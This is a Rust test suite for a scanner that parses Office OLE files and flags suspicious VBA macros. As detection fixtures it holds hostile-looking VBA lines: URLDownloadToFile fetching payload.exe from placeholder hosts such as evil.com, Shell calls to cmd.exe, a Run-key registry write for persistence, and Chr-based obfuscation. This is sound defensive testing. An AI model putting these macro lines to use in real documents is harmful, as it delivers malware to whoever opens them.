    let mut file = std::fs::File::open(temp_file.path()).unwrap();
    let result = detect_ole_file_type(&mut file);
    // Should detect as OLE document type
    assert!(result.is_ok());

    // Test with ZIP/OOXML signature
    let mut zip_header = vec![0u8; 512];
    zip_header[0..2].copy_from_slice(b"PK");

    let mut temp_file2 = NamedTempFile::new().unwrap();
    temp_file2.write_all(&zip_header).unwrap();
    temp_file2.flush().unwrap();

    let mut file2 = std::fs::File::open(temp_file2.path()).unwrap();
    let result2 = detect_ole_file_type(&mut file2);
    assert!(result2.is_ok());
    match result2.unwrap() {
        OleFileType::OfficeOpenXml => {}
        _ => panic!("Expected OfficeOpenXml type"),
    }

    // Test with insufficient header
    let mut temp_file3 = NamedTempFile::new().unwrap();
    temp_file3.write_all(b"short").unwrap();
    temp_file3.flush().unwrap();

    let mut file3 = std::fs::File::open(temp_file3.path()).unwrap();
    let result3 = detect_ole_file_type(&mut file3);
    assert!(result3.is_err());
}

#[test]
fn test_stream_type_determination() {
    use file_scanner::ole_vba_analysis::determine_stream_type;

    assert!(matches!(
        determine_stream_type("VBA/dir"),
        StreamType::VbaProject
    ));
    assert!(matches!(
        determine_stream_type("VBA_PROJECT"),
        StreamType::VbaProject
    ));
    assert!(matches!(
        determine_stream_type("MODULE1"),
        StreamType::VbaModule
    ));
    assert!(matches!(
        determine_stream_type("WordDocument"),
        StreamType::WordDocument
    ));
    assert!(matches!(
        determine_stream_type("Workbook"),
        StreamType::ExcelWorkbook
    ));
    assert!(matches!(
        determine_stream_type("Book"),
        StreamType::ExcelWorkbook
    ));
    assert!(matches!(
        determine_stream_type("PowerPoint Document"),
        StreamType::PowerPointDocument
    ));
    assert!(matches!(
        determine_stream_type("\x05SummaryInformation"),
        StreamType::Metadata
    ));
    assert!(matches!(
        determine_stream_type("\x05DocumentSummaryInformation"),
        StreamType::Metadata
    ));
    assert!(matches!(
        determine_stream_type("unknown_stream"),
        StreamType::Unknown
    ));
}

#[test]
fn test_procedure_extraction() {
    use file_scanner::ole_vba_analysis::extract_procedures_from_source;

    let vba_code = r#"
Sub Auto_Open()
    Shell "cmd.exe"
End Sub

Function GetValue(param1 As String, param2 As Integer) As String
    Dim result As String
    result = "test"
    GetValue = result
End Function

Property Get MyProperty() As String
    MyProperty = "property_value"
End Property
"#;

    let procedures = extract_procedures_from_source(vba_code);
    assert_eq!(procedures.len(), 3);

    // Check first procedure (Sub)
    assert_eq!(procedures[0].name, "Auto_Open");
    assert!(matches!(
        procedures[0].procedure_type,
        VbaProcedureType::Sub
    ));
    assert_eq!(procedures[0].parameters.len(), 0);

    // Check second procedure (Function with parameters)
    assert_eq!(procedures[1].name, "GetValue");
    assert!(matches!(
        procedures[1].procedure_type,
        VbaProcedureType::Function
    ));
    assert_eq!(procedures[1].parameters.len(), 2);
    assert!(procedures[1].parameters[0].contains("param1"));
    assert!(procedures[1].parameters[1].contains("param2"));

    // Check third procedure (Property)
    assert_eq!(procedures[2].name, "MyProperty");
    assert!(matches!(
        procedures[2].procedure_type,
        VbaProcedureType::Property
    ));
}

#[test]
fn test_procedure_name_extraction() {
    use file_scanner::ole_vba_analysis::extract_procedure_name;

    assert_eq!(extract_procedure_name("Sub MySubroutine()"), "MySubroutine");
    assert_eq!(
        extract_procedure_name("Function TestFunc(param1, param2)"),
        "TestFunc"
    );
    assert_eq!(
        extract_procedure_name("Property Get TestProperty()"),
        "TestProperty"
    );
    assert_eq!(extract_procedure_name("Sub"), "Unknown");
    assert_eq!(extract_procedure_name(""), "Unknown");
}

#[test]
fn test_parameter_extraction() {
    use file_scanner::ole_vba_analysis::extract_parameters;

    let params1 = extract_parameters("Sub Test(param1 As String, param2 As Integer)");
    assert_eq!(params1.len(), 2);
    assert_eq!(params1[0], "param1 As String");
    assert_eq!(params1[1], "param2 As Integer");

    let params2 = extract_parameters("Function Test()");
    assert_eq!(params2.len(), 0);

    let params3 = extract_parameters("Sub TestNoParens");
    assert_eq!(params3.len(), 0);
}

#[test]
fn test_suspicious_vba_pattern_detection() {
    use file_scanner::ole_vba_analysis::detect_suspicious_vba_patterns;

    let malicious_code = r#"
Sub Evil()
    Shell "cmd.exe /c dir"
    CreateObject("WScript.Shell")
    URLDownloadToFile "http://evil.com/payload.exe"
    Base64Decode("malicious_data")
End Sub
"#;

    let patterns = detect_suspicious_vba_patterns(malicious_code);
    assert!(!patterns.is_empty());
    assert!(patterns.iter().any(|p| p.contains("shell")));
    assert!(patterns.iter().any(|p| p.contains("createobject")));
    assert!(patterns.iter().any(|p| p.contains("urldownloadtofile")));
    assert!(patterns.iter().any(|p| p.contains("base64")));

    let clean_code = "Sub CleanFunction()\nEnd Sub";
    let clean_patterns = detect_suspicious_vba_patterns(clean_code);
    assert!(clean_patterns.is_empty());
}

#[test]
fn test_suspicious_api_call_detection() {
    use file_scanner::ole_vba_analysis::detect_suspicious_api_calls;

    let malicious_code = r#"
Sub Malicious()
    CreateObject("Excel.Application")
    Shell "powershell.exe"
    WScript.Shell.Run "cmd.exe"
    URLDownloadToFile null, "http://evil.com", "C:\temp\bad.exe", 0, 0
End Sub
"#;

    let api_calls = detect_suspicious_api_calls(malicious_code, "TestModule");
    assert!(!api_calls.is_empty());

    let create_object_call = api_calls.iter().find(|c| c.api_name == "createobject");
    assert!(create_object_call.is_some());
    assert!(matches!(
        create_object_call.unwrap().risk_level,
        RiskLevel::High
    ));

    let shell_call = api_calls.iter().find(|c| c.api_name == "shell");
    assert!(shell_call.is_some());
    assert!(matches!(
        shell_call.unwrap().risk_level,
        RiskLevel::Critical
    ));
}

#[test]
fn test_obfuscation_detection() {
    use file_scanner::ole_vba_analysis::detect_obfuscation_patterns;

    // Test string concatenation obfuscation
    let concat_code = "Dim cmd As String\ncmd = \"c\" & \"m\" & \"d\" & \".\" & \"e\" & \"x\" & \"e\" & \" \" & \"/\" & \"c\" & \" \" & \"d\" & \"i\" & \"r\"";
    let concat_indicators = detect_obfuscation_patterns(concat_code, "Module1");
    assert!(concat_indicators
        .iter()
        .any(|i| matches!(i.technique, ObfuscationType::StringConcatenation)));

    // Test character code obfuscation
    let chr_code = "Dim cmd As String\ncmd = Chr(99) & Chr(109) & Chr(100) & Chr(46) & Chr(101) & Chr(120) & Chr(101)";
    let chr_indicators = detect_obfuscation_patterns(chr_code, "Module1");
    assert!(chr_indicators
        .iter()
        .any(|i| matches!(i.technique, ObfuscationType::CharCodeObfuscation)));

    // Test base64 encoding
    let base64_code = "Dim encoded As String\nencoded = Base64Decode(\"SGVsbG8gV29ybGQ=\")";
    let base64_indicators = detect_obfuscation_patterns(base64_code, "Module1");
    assert!(base64_indicators
        .iter()
        .any(|i| matches!(i.technique, ObfuscationType::Base64Encoding)));
}

#[test]
fn test_external_connection_detection() {
    use file_scanner::ole_vba_analysis::detect_external_connections;

    let network_code = r#"
Sub DownloadPayload()
    URLDownloadToFile "https://malicious.com/payload.exe"
    FTPConnect "ftp://evil-server.com"
End Sub
"#;

    let connections = detect_external_connections(network_code, "NetworkModule");
    assert_eq!(connections.len(), 2);

    let http_conn = connections
        .iter()
        .find(|c| matches!(c.connection_type, ConnectionType::HttpRequest));
    assert!(http_conn.is_some());

    let ftp_conn = connections
        .iter()
        .find(|c| matches!(c.connection_type, ConnectionType::FtpConnection));
    assert!(ftp_conn.is_some());
}

#[test]
fn test_file_operation_detection() {
    use file_scanner::ole_vba_analysis::detect_file_operations;

    let file_code = r#"
Sub FileOperations()
    Open "C:\test.txt" For Output As #1
    Write #1, "data"
    Kill "C:\victim.txt"
    Copy "source.txt", "dest.txt"
    MkDir "C:\new_folder"
End Sub
"#;

    let operations = detect_file_operations(file_code, "FileModule");
    assert!(!operations.is_empty());

    let write_ops = operations
        .iter()
        .filter(|op| matches!(op.operation_type, FileOperationType::Write))
        .count();
    assert!(write_ops > 0);

    let delete_ops = operations
        .iter()
        .filter(|op| matches!(op.operation_type, FileOperationType::Delete))
        .count();
    assert!(delete_ops > 0);
}

#[test]
fn test_registry_operation_detection() {
    use file_scanner::ole_vba_analysis::detect_registry_operations;

    let registry_code = r#"
Sub RegistryAccess()
    RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\MyApp", "C:\malware.exe"
    RegCreateKey "HKEY_LOCAL_MACHINE\Software\BadSoftware"
End Sub
"#;

    let operations = detect_registry_operations(registry_code, "RegistryModule");
    assert!(!operations.is_empty());

    let write_op = operations
        .iter()
        .find(|op| matches!(op.operation_type, RegistryOperationType::Write));
    assert!(write_op.is_some());
    assert!(matches!(write_op.unwrap().risk_level, RiskLevel::High));
}

#[test]
fn test_process_operation_detection() {
    use file_scanner::ole_vba_analysis::detect_process_operations;

    let process_code = r#"
Sub ProcessManipulation()
    Shell "cmd.exe /c whoami"
    CreateProcess "notepad.exe"
End Sub
"#;

    let operations = detect_process_operations(process_code, "ProcessModule");
    assert!(!operations.is_empty());

    let create_op = operations
        .iter()
        .find(|op| matches!(op.operation_type, ProcessOperationType::Create));
    assert!(create_op.is_some());
    assert!(matches!(create_op.unwrap().risk_level, RiskLevel::Critical));
}

#[test]
fn test_crypto_operation_detection() {
    use file_scanner::ole_vba_analysis::detect_crypto_operations;

    let crypto_code = r#"
Sub CryptoOperations()
    EncryptData "sensitive_data", "AES"
    MD5Hash "password"
    SHA256 "document_content"
End Sub
"#;

    let operations = detect_crypto_operations(crypto_code, "CryptoModule");
    assert!(!operations.is_empty());

    let encrypt_op = operations.iter().find(|op| op.algorithm == "encrypt");
    assert!(encrypt_op.is_some());
    assert!(matches!(encrypt_op.unwrap().risk_level, RiskLevel::Medium));
}

#[test]
fn test_risk_score_calculation() {
    use file_scanner::ole_vba_analysis::calculate_risk_score;

    // Test with no suspicious indicators
    let clean_indicators = SuspiciousIndicators::default();
    assert_eq!(calculate_risk_score(&clean_indicators), 0);

    // Test with macros only
    let macro_indicators = SuspiciousIndicators {
        has_macros: true,
        ..Default::default()
    };
    assert_eq!(calculate_risk_score(&macro_indicators), 20);

    // Test with auto-execution
    let auto_exec_indicators = SuspiciousIndicators {
        has_macros: true,
        auto_exec_macros: vec!["Module1:Auto_Open".to_string()],
        ..Default::default()
    };
    assert_eq!(calculate_risk_score(&auto_exec_indicators), 45); // 20 + 25

    // Test with critical API calls
    let critical_indicators = SuspiciousIndicators {
        has_macros: true,
        suspicious_api_calls: vec![SuspiciousApiCall {
            api_name: "shell".to_string(),
            module_name: "Module1".to_string(),
            call_count: 1,
            context: "test".to_string(),
            risk_level: RiskLevel::Critical,
            description: "test".to_string(),
        }],
        ..Default::default()
    };
    assert_eq!(calculate_risk_score(&critical_indicators), 50); // 20 + 30
}

#[test]
fn test_overall_risk_determination() {
    use file_scanner::ole_vba_analysis::determine_overall_risk;

    // Test low risk
    let low_risk_factors = vec![RiskFactor {
        factor_type: RiskFactorType::MacroPresence,
        description: "test".to_string(),
        severity: RiskLevel::Low,
        confidence: 1.0,
    }];
    assert!(matches!(
        determine_overall_risk(&low_risk_factors, 10),
        RiskLevel::Low
    ));

    // Test high risk due to score
    assert!(matches!(determine_overall_risk(&[], 70), RiskLevel::High));

    // Test critical risk due to score
    assert!(matches!(
        determine_overall_risk(&[], 90),
        RiskLevel::Critical
    ));

    // Test critical risk due to critical factors
    let critical_risk_factors = vec![RiskFactor {
        factor_type: RiskFactorType::SuspiciousApiCalls,
        description: "test".to_string(),
        severity: RiskLevel::Critical,
        confidence: 1.0,
    }];
    assert!(matches!(
        determine_overall_risk(&critical_risk_factors, 30),
        RiskLevel::Critical
    ));
}

#[test]
fn test_vba_reference_parsing() {
    use file_scanner::ole_vba_analysis::parse_vba_reference;

    let ref_string =
        "{00020430-0000-0000-C000-000000000046}*stdole*2.0*C:\\Windows\\System32\\stdole2.tlb";
    let reference = parse_vba_reference(ref_string);

    assert_eq!(reference.name, "stdole");
    assert_eq!(
        reference.guid,
        Some("{00020430-0000-0000-C000-000000000046}".to_string())
    );
    assert_eq!(reference.version, Some("2.0".to_string()));
    assert_eq!(
        reference.path,
        Some("C:\\Windows\\System32\\stdole2.tlb".to_string())
    );
    assert!(matches!(
        reference.reference_type,
        VbaReferenceType::TypeLib
    ));

    // Test malformed reference
    let malformed_ref = "incomplete_reference_string";
    let malformed_reference = parse_vba_reference(malformed_ref);
    assert_eq!(malformed_reference.name, "Unknown");
}

#[test]
fn test_property_set_parsing() {
    use file_scanner::ole_vba_analysis::parse_property_set;

    let mut metadata = OleMetadata::default();

    // Test with title and author in property set
    let property_data = b"\x00\x00Title\x00Test Document\x00\x00Author\x00John Doe\x00\x00";
    let result = parse_property_set(property_data, &mut metadata);
    assert!(result.is_ok());

    // Basic parsing should work (simplified implementation)
    // Note: Real property set parsing is complex and the current implementation is simplified
}

#[test]
fn test_module_type_detection() {
    // Module type detection is tested through the logic used in extract_module_content

    // This test would require mocking CFB structure, which is complex
    // Instead, we'll test the logic used within the function

    // Test module type detection logic
    let class_module_name = "ClassModule1";
    let form_module_name = "UserForm1";
    let document_module_name = "ThisDocument";
    let sheet_module_name = "Sheet1";
    let standard_module_name = "Module1";

    // These would be determined within extract_module_content
    assert!(class_module_name.contains("Class"));
    assert!(form_module_name.contains("Form"));
    assert!(document_module_name.contains("ThisDocument"));
    assert!(sheet_module_name.contains("Sheet"));
    assert!(!standard_module_name.contains("Class") && !standard_module_name.contains("Form"));
}

#[test]
fn test_security_assessment_generation() {
    // Test comprehensive security assessment
    let high_risk_indicators = SuspiciousIndicators {
        has_macros: true,
        auto_exec_macros: vec!["Module1:Auto_Open".to_string()],
        suspicious_api_calls: vec![SuspiciousApiCall {
            api_name: "shell".to_string(),
            module_name: "Module1".to_string(),
            call_count: 1,
            context: "test".to_string(),
            risk_level: RiskLevel::Critical,
            description: "Command execution".to_string(),
        }],
        external_connections: vec![ExternalConnection {
            connection_type: ConnectionType::HttpRequest,
            target: "https://malicious.com".to_string(),
            method: "GET".to_string(),
            location: "Module1".to_string(),
        }],
        obfuscated_code: vec![ObfuscationIndicator {
            technique: ObfuscationType::StringConcatenation,
            description: "String obfuscation".to_string(),
            location: "Module1".to_string(),
            confidence: 0.8,
        }],
        risk_score: 85,
        ..Default::default()
    };

    let assessment = perform_security_assessment(&high_risk_indicators, &[]).unwrap();

    assert!(matches!(assessment.overall_risk, RiskLevel::Critical));
    assert!(!assessment.risk_factors.is_empty());
    assert!(!assessment.recommendations.is_empty());
    assert!(!assessment.ioc_indicators.is_empty());

    // Check for macro presence risk factor
    assert!(assessment
        .risk_factors
        .iter()
        .any(|f| matches!(f.factor_type, RiskFactorType::MacroPresence)));

    // Check for auto-execution risk factor
    assert!(assessment
        .risk_factors
        .iter()
        .any(|f| matches!(f.factor_type, RiskFactorType::AutoExecution)));

    // Check for suspicious API calls risk factor
    assert!(assessment
        .risk_factors
        .iter()
        .any(|f| matches!(f.factor_type, RiskFactorType::SuspiciousApiCalls)));

    // Check for network connections risk factor
    assert!(assessment
        .risk_factors
        .iter()
        .any(|f| matches!(f.factor_type, RiskFactorType::NetworkConnections)));

    // Check for obfuscation risk factor
    assert!(assessment
        .risk_factors
        .iter()
        .any(|f| matches!(f.factor_type, RiskFactorType::Obfuscation)));

    // Check IOC extraction
    let url_ioc = assessment
        .ioc_indicators
        .iter()
        .find(|i| matches!(i.indicator_type, IocType::Url));
    assert!(url_ioc.is_some());
    assert_eq!(url_ioc.unwrap().value, "https://malicious.com");
}

#[test]
fn test_create_ole_signature_file() {
    // Create a test file with OLE2 signature for integration testing
    let mut temp_file = NamedTempFile::new().unwrap();

    // Write OLE2 signature and minimal header
    let mut ole_header = vec![0u8; 512];
    // OLE2 signature
    ole_header[0..8].copy_from_slice(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1");
    // Minor version
    ole_header[24..26].copy_from_slice(&[0x3E, 0x00]);
    // Major version
    ole_header[26..28].copy_from_slice(&[0x03, 0x00]);
    // Byte order
    ole_header[28..30].copy_from_slice(&[0xFE, 0xFF]);
    // Sector size (512 bytes = 2^9)
    ole_header[30..32].copy_from_slice(&[0x09, 0x00]);
    // Mini sector size (64 bytes = 2^6)
    ole_header[32..34].copy_from_slice(&[0x06, 0x00]);

    temp_file.write_all(&ole_header).unwrap();
    temp_file.flush().unwrap();

    let result = analyze_ole_vba(temp_file.path());

    // Should successfully detect as OLE file but without VBA content
    if let Ok(analysis) = result {
        // Should be detected as some form of OLE document
        assert!(!matches!(analysis.file_type, OleFileType::NotOleFile));
        assert!(analysis.ole_structure.is_some());
        assert!(analysis.vba_project.is_none());
        assert!(analysis.macros.is_empty());
        assert!(!analysis.suspicious_indicators.has_macros);
        assert_eq!(analysis.suspicious_indicators.risk_score, 0);
    } else {
        // OLE parsing might fail with minimal header, which is acceptable
        // The important thing is that it attempts to parse as OLE
    }
}

#[test]
fn test_integration_with_zip_file() {
    // Create a test file with ZIP signature (simulating OOXML)
    let mut temp_file = NamedTempFile::new().unwrap();

    // Write ZIP signature and minimal header
    let mut zip_header = vec![0u8; 512];
    zip_header[0..4].copy_from_slice(b"PK\x03\x04"); // ZIP local file header

    temp_file.write_all(&zip_header).unwrap();
    temp_file.flush().unwrap();

    let result = analyze_ole_vba(temp_file.path());

    // Should be detected as OOXML but no VBA content
    if let Ok(analysis) = result {
        assert!(matches!(analysis.file_type, OleFileType::OfficeOpenXml));
        assert!(analysis.ole_structure.is_none());
        assert!(analysis.vba_project.is_none());
        assert!(analysis.macros.is_empty());
        assert!(!analysis.suspicious_indicators.has_macros);
    } else {
        // ZIP parsing might fail with minimal header, which is acceptable
    }
}

#[test]
fn test_error_handling_comprehensive() {
    // Test with non-existent file
    let result = analyze_ole_vba(Path::new("/non/existent/file/path"));
    assert!(result.is_err());

    // Test with directory instead of file
    let temp_dir = tempfile::tempdir().unwrap();
    let result = analyze_ole_vba(temp_dir.path());
    assert!(result.is_err());

    // Test with empty file
    let mut empty_file = NamedTempFile::new().unwrap();
    empty_file.flush().unwrap();

    let result = analyze_ole_vba(empty_file.path());
    // Should fail due to insufficient header size
    assert!(result.is_err());

    // Test with file that's too small for OLE header
    let mut small_file = NamedTempFile::new().unwrap();
    small_file.write_all(b"small").unwrap();
    small_file.flush().unwrap();

    let result = analyze_ole_vba(small_file.path());
    // Should fail due to insufficient header size
    assert!(result.is_err());
}

#[test]
fn test_corrupted_ole_file_handling() {
    // Create a file with OLE signature but corrupted structure
    let mut temp_file = NamedTempFile::new().unwrap();

    let mut corrupted_header = vec![0u8; 512];
    // Valid OLE2 signature
    corrupted_header[0..8].copy_from_slice(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1");
    // But invalid/corrupted structure after that
    for byte in corrupted_header.iter_mut().skip(8).take(512 - 8) {
        *byte = 0xFF; // Fill with invalid data
    }

    temp_file.write_all(&corrupted_header).unwrap();
    temp_file.flush().unwrap();

    let result = analyze_ole_vba(temp_file.path());

    // Should either fail gracefully or return analysis with minimal data
    if let Ok(analysis) = result {
        // If it succeeds, should at least detect as OLE type
        assert!(!matches!(analysis.file_type, OleFileType::NotOleFile));
    } else {
        // Failure is acceptable for corrupted files
    }
}

#[test]
fn test_large_file_handling() {
    // Test with a larger file to ensure performance
    let mut temp_file = NamedTempFile::new().unwrap();

    // Create a larger buffer with OLE signature
    let mut large_data = vec![0u8; 10240]; // 10KB
    large_data[0..8].copy_from_slice(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1");

    temp_file.write_all(&large_data).unwrap();
    temp_file.flush().unwrap();

    let result = analyze_ole_vba(temp_file.path());

    // Should handle larger files without issues
    if let Ok(_analysis) = result {
        // Successfully handled large file
    } else {
        // Parsing might fail due to invalid structure, which is acceptable
    }
}

#[test]
fn test_binary_data_in_streams() {
    // Test entropy calculation with various binary patterns
    let binary_patterns = [
        vec![0x00; 1000],                                    // All zeros - low entropy
        vec![0xFF; 1000],                                    // All ones - low entropy
        (0..=255u8).cycle().take(1024).collect::<Vec<u8>>(), // Max entropy
        vec![0xAA; 1000],                                    // Alternating pattern
        (0..100u8).cycle().take(1000).collect::<Vec<u8>>(),  // Medium entropy
    ];

    for (i, pattern) in binary_patterns.iter().enumerate() {
        let entropy = calculate_entropy(pattern);

        match i {
            0 | 1 | 3 => assert!(entropy < 2.0, "Pattern {i} should have low entropy"),
            2 => assert!(entropy > 7.5, "Pattern {i} should have high entropy"),
            4 => assert!(
                entropy > 4.0 && entropy < 7.0,
                "Pattern {i} should have medium entropy"
            ),
            _ => {}
        }
    }
}

#[test]
fn test_macro_extraction_edge_cases() {
    // Test procedure extraction with edge cases
    let edge_case_vba = r#"
' Comment at the start
Sub ProceduireWithComments()
    ' This is a comment
    Dim x As Integer ' Another comment
    x = 5
End Sub

    Sub IndentedProcedure()  
        Dim y As String
        y = "test"
    End Sub

Function FunctionWithoutEndFunction(param As String)
    Return param & "_modified"
' Missing End Function

Property Get PropertyWithComplexParams(index As Integer, Optional default As String = "")
    PropertyWithComplexParams = "value_" & index & default
End Property

' Incomplete procedure at end
Sub IncompleteProcedure()
    Dim incomplete As Boolean
"#;

    let procedures = extract_procedures_from_source(edge_case_vba);

    // Should extract all procedures even with edge cases
    assert!(procedures.len() >= 3); // At least the complete procedures

    // Check that comments don't break extraction
    let first_proc = &procedures[0];
    assert_eq!(first_proc.name, "ProceduireWithComments");

    // Check indented procedure
    let indented_proc = procedures.iter().find(|p| p.name == "IndentedProcedure");
    assert!(indented_proc.is_some());

    // Check property procedure
    let property_proc = procedures
        .iter()
        .find(|p| p.name == "PropertyWithComplexParams");
    assert!(property_proc.is_some());
    assert!(matches!(
        property_proc.unwrap().procedure_type,
        VbaProcedureType::Property
    ));
}

#[test]
fn test_performance_with_large_vba_code() {
    // Test with a large VBA code sample
    let mut large_vba = String::new();

    // Generate a large VBA code sample
    for i in 0..100 {
        large_vba.push_str(&format!(
            r#"
Sub Procedure{i}()
    Dim var{i} As String
    var{i} = "value_{i}"
    Shell "cmd.exe /c echo {i}"
    CreateObject("WScript.Shell")
End Sub
"#
        ));
    }

    let start_time = std::time::Instant::now();

    // Test procedure extraction
    let procedures = extract_procedures_from_source(&large_vba);
    assert_eq!(procedures.len(), 100);

    // Test suspicious pattern detection
    let patterns = detect_suspicious_vba_patterns(&large_vba);
    assert!(!patterns.is_empty());

    // Test API call detection
    let api_calls = detect_suspicious_api_calls(&large_vba, "LargeModule");
    assert!(!api_calls.is_empty());

    let elapsed = start_time.elapsed();
    // Should complete within reasonable time (adjust threshold as needed)
    assert!(
        elapsed.as_millis() < 1000,
        "Large VBA processing took too long: {elapsed:?}"
    );
}

#[test]
fn test_unicode_and_special_characters() {
    // Test with VBA code containing unicode and special characters
    let unicode_vba = r#"
Sub UnicodeTest()
    Dim message As String
    message = "Hello, 世界! 🚀"
    Debug.Print "Тест на русском"
    ' Special characters in comments: áéíóú ñü
End Sub

Function SpecialCharsInName_123(param_with_underscores As String)
    Return "Result: " & param_with_underscores
End Function
"#;

    let procedures = extract_procedures_from_source(unicode_vba);
    assert_eq!(procedures.len(), 2);

    // Check that procedure names are extracted correctly
    assert_eq!(procedures[0].name, "UnicodeTest");
    assert_eq!(procedures[1].name, "SpecialCharsInName_123");

    // Test pattern detection with unicode content
    let _patterns = detect_suspicious_vba_patterns(unicode_vba);
    // Should still work with unicode content
}

#[test]
fn test_malformed_vba_syntax() {
    // Test with malformed VBA syntax
    let malformed_vba = r"
Sub MalformedSub(
    ' Missing closing parenthesis
    Dim x As
    ' Missing type
    x = 
    ' Incomplete assignment
End Sub

Function ()
    ' Function without name
End Function

Sub UnmatchedEnd()
    If True Then
End Sub
' Missing End If

Sub
' Missing procedure name
End Sub
";

    // Should handle malformed syntax gracefully
    let procedures = extract_procedures_from_source(malformed_vba);
    // Should extract what it can, even from malformed code
    assert!(!procedures.is_empty());

    // Pattern detection should still work
    let _patterns = detect_suspicious_vba_patterns(malformed_vba);
    // Should not crash on malformed syntax
}

#[test]
fn test_mixed_case_api_detection() {
    // Test API detection with mixed case
    let mixed_case_code = r#"
Sub MixedCaseTest()
    SHELL "cmd.exe"
    CreateObject "wscript.shell"
    URLDownloadToFile "http://example.com"
    RegWrite "HKEY_CURRENT_USER\\test"
End Sub
"#;

    let api_calls = detect_suspicious_api_calls(mixed_case_code, "MixedCaseModule");

    // Should detect APIs regardless of case
    assert!(api_calls.iter().any(|call| call.api_name.contains("shell")));
    assert!(api_calls
        .iter()
        .any(|call| call.api_name.contains("createobject")));
    assert!(api_calls
        .iter()
        .any(|call| call.api_name.contains("urldownloadtofile")));
    assert!(api_calls
        .iter()
        .any(|call| call.api_name.contains("regwrite")));
}

#[test]
fn test_nested_procedure_structures() {
    // Test with nested structures (which VBA doesn't really support, but test parser robustness)
    let nested_code = r"
Sub OuterProcedure()
    If True Then
        Sub NestedSub()
            ' This isn't valid VBA but test parser robustness
        End Sub
    End If
End Sub

Function ComplexFunction()
    For i = 1 To 10
        If i Mod 2 = 0 Then
            Debug.Print i
        End If
    Next i
End Function
";

    let procedures = extract_procedures_from_source(nested_code);

    // Should handle complex structures without crashing
    let outer_proc = procedures.iter().find(|p| p.name == "OuterProcedure");
    assert!(outer_proc.is_some());

    let complex_func = procedures.iter().find(|p| p.name == "ComplexFunction");
    assert!(complex_func.is_some());
    assert!(matches!(
        complex_func.unwrap().procedure_type,
        VbaProcedureType::Function
    ));
}
